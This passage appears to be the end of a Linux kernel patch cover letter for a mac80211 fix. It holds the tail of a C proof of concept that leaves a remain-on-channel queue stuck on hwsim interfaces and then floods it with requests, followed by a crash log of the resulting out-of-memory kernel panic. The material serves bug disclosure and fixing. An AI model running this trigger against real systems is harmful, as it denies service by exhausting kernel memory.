	       opts.if_a, opts.if_b);
	ret = send_work(nl80211_fd, nl80211_family, &opts, if_a, opts.freq_a, sa_a);
	if (ret)
		die_errno("initial work on interface A", ret);
	msleep(opts.sleep_after_a_ms);

	ret = send_work(nl80211_fd, nl80211_family, &opts, if_b, opts.freq_b, sa_b);
	if (ret)
		die_errno("initial queued work on interface B", ret);
	msleep(opts.sleep_after_b_ms);

	if (run_cmd(IP_BIN " link set %s down", opts.if_a))
		exit(1);

	printf("interface %s is down; %s should now have a stuck ROC head\n",
	       opts.if_a, opts.if_b);

	msleep(opts.pause_before_loop_ms);

	for (i = 0; i < opts.loops; i++) {
		ret = send_work(nl80211_fd, nl80211_family, &opts,
				if_b, opts.freq_b, sa_b);
		if (ret)
			die_errno("repeated queued work on interface B", ret);
		if ((i % 1000) == 0)
			printf("queued %u/%u additional requests on %s\n",
			       i + 1, opts.loops, opts.if_b);
	}

	printf("completed %u additional requests on %s\n", opts.loops, opts.if_b);

	run_cmd(IW_BIN " dev %s del", opts.if_b);
	ret = hwsim_del_radio(hwsim_fd, hwsim_family, &opts);
	if (ret)
		fprintf(stderr, "warning: HWSIM_CMD_DEL_RADIO failed: %s\n",
			strerror(-ret));

	close(nl80211_fd);
	close(hwsim_fd);
	return 0;
}


------END PoC--------

----BEGIN crash log----

[ 2524.974090][ T5169] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
[ 2524.974899][ T5169] CPU: 0 UID: 0 PID: 5169 Comm: systemd-udevd Not tainted 6.12.95 #2
[ 2524.975489][ T5169] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[ 2524.976371][ T5169] Call Trace:
[ 2524.976605][ T5169]  <TASK>
[ 2524.976807][ T5169]  panic+0x533/0x610
[ 2524.977098][ T5169]  ? dump_header+0x5d2/0x800
[ 2524.977469][ T5169]  ? __pfx_panic+0x10/0x10
[ 2524.977827][ T5169]  out_of_memory+0x73c/0x1430
[ 2524.978142][ T5169]  ? __alloc_pages_noprof+0xd53/0x26d0
[ 2524.978509][ T5169]  ? __pfx_out_of_memory+0x10/0x10
[ 2524.978911][ T5169]  ? lock_acquire+0x2f/0xb0
[ 2524.979208][ T5169]  ? __alloc_pages_noprof+0xd53/0x26d0
[ 2524.979583][ T5169]  __alloc_pages_noprof+0x1ecc/0x26d0
[ 2524.980042][ T5169]  ? hlock_class+0x4e/0x130
[ 2524.980357][ T5169]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 2524.980718][ T5169]  ? __lock_acquire+0xc96/0x3c40
[ 2524.981046][ T5169]  ? __pfx___alloc_pages_noprof+0x10/0x10
[ 2524.981587][ T5169]  ? __pfx___lock_acquire+0x10/0x10
[ 2524.982022][ T5169]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 2524.982420][ T5169]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 2524.982840][ T5169]  ? find_held_lock+0x2d/0x110
[ 2524.983161][ T5169]  alloc_pages_mpol_noprof+0x1ab/0x4d0
[ 2524.983531][ T5169]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
[ 2524.984022][ T5169]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 2524.984404][ T5169]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 2524.984761][ T5169]  ? xas_load+0x1e2/0x410
[ 2524.985110][ T5169]  ? filemap_get_entry+0xbd/0x2c0
[ 2524.985506][ T5169]  folio_alloc_noprof+0x16/0x90
[ 2524.985829][ T5169]  filemap_alloc_folio_noprof+0x279/0x320
[ 2524.986202][ T5169]  ? __pfx_filemap_alloc_folio_noprof+0x10/0x10
[ 2524.986715][ T5169]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 2524.987182][ T5169]  __filemap_get_folio+0x35b/0x7a0
[ 2524.987581][ T5169]  filemap_fault+0x10db/0x1fe0
[ 2524.987966][ T5169]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 2524.988352][ T5169]  ? __pfx_filemap_fault+0x10/0x10
[ 2524.988722][ T5169]  ? __pfx_lock_release+0x10/0x10
[ 2524.989127][ T5169]  __do_fault+0xed/0x3a0
[ 2524.989435][ T5169]  do_pte_missing+0x10c9/0x3710
[ 2524.989763][ T5169]  ? pte_offset_map_nolock+0x7a/0x170
[ 2524.990140][ T5169]  __handle_mm_fault+0xac8/0x1db0
[ 2524.990551][ T5169]  ? __pfx_lock_release+0x10/0x10
[ 2524.990882][ T5169]  ? down_read_trylock+0x1f0/0x3f0
[ 2524.991220][ T5169]  ? lock_vma_under_rcu+0x121/0x720
[ 2524.991660][ T5169]  ? __pfx___handle_mm_fault+0x10/0x10
[ 2524.992059][ T5169]  ? __might_fault+0xb6/0x120
[ 2524.992422][ T5169]  handle_mm_fault+0x2ad/0x910
[ 2524.992797][ T5169]  do_user_addr_fault+0x301/0xe10
[ 2524.993240][ T5169]  exc_page_fault+0x5d/0xe0
[ 2524.993557][ T5169]  asm_exc_page_fault+0x26/0x30
[ 2524.993879][ T5169] RIP: 0033:0x7fdf6abe35c0
[ 2524.994184][ T5169] Code: Unable to access opcode bytes at 0x7fdf6abe3596.
[ 2524.994673][ T5169] RSP: 002b:00007ffc3a5e7808 EFLAGS: 00010202
[ 2524.995073][ T5169] RAX: 0000000000000000 RBX: 00007ffc3a5e7880 RCX: 0000000000000000
[ 2524.995589][ T5169] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 00000000fffffff7
[ 2524.996113][ T5169] RBP: 000000000000000a R08: 0000000000000000 R09: 00000000ffffffff
[ 2524.996651][ T5169] R10: 00007fdf6ad295e4 R11: 00000000ffffffff R12: 0000558c4f2ae340
[ 2524.997160][ T5169] R13: 0000558c4f7730d0 R14: 0000000000000002 R15: 0000000000000001
[ 2524.997743][ T5169]  </TASK>
[ 2524.998122][ T5169] Kernel Offset: disabled
[ 2524.998497][ T5169] Rebooting in 86400 seconds..


-----END crash log-----

Best regards,
Ruide Cao

Ruide Cao (1):
  mac80211: start next ROC after purging an interface

 net/mac80211/offchannel.c | 10 ++++++++++
 1 file changed, 10 insertions(+)


base-commit: 24ef02f934eeb48830cff6b739abc3c62b1d107b
-- 
2.47.3
